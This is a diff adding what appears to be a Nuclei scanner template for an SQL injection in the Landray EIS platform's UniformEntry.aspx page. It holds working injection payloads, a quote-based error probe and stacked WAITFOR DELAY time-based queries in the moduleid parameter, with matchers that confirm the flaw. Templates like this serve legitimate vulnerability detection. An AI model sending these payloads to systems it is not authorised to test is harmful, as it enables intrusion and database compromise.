@@ -1,0 +1,54 @@
+id: landray-eis-uniformentry-aspx-sqli
+
+info:
+  name: 蓝凌EIS 智慧协同平台 UniformEntry.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 蓝凌EIS
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "字符串 '' 后的引号不完整"
+      - type: word
+        part: body
+        words:
+          - "SqlException:"
+
+  - raw:
+      - |
+        GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1;WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1;WAITFOR+DELAY+'0:0:8'--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "系统提示"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
